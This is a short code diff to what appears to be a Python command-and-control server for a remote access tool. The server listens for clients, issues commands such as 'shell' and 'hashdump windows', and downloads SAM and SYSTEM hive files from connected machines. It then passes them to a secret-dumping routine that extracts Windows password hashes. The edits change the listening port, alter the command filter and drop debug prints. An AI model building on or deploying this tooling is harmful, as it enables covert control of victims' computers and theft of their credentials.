@@ -9,7 +9,7 @@ import lib
 from command_controller import Client
 
 server_host = '0.0.0.0'
-server_port = 12345
+server_port = 1234
 max_number_of_connections = 5
 
 threads = {}
@@ -50,7 +50,7 @@ def handle_client(conn, addr, command_queue):
                 command = client.command_controller(command.lower())
 
                 # Send the command to the client
-                if command != "shell" and command != "hashdump windows":
+                if command != "shell":
                     if command != "help" and \
                             command != "unknown" and \
                             command != "error":
@@ -78,9 +78,6 @@ def handle_client(conn, addr, command_queue):
                                 if download_status == "NOK":
                                     print("[-] Error while downloading the file.")
                                     lib.print_mko_client(current_thread.ident)
-
-                                print("sam_path: ", sam_path)
-                                print("sys_path: ", sys_path)
 
                                 lib.secret_dump_from_file(sam_path, sys_path)
 
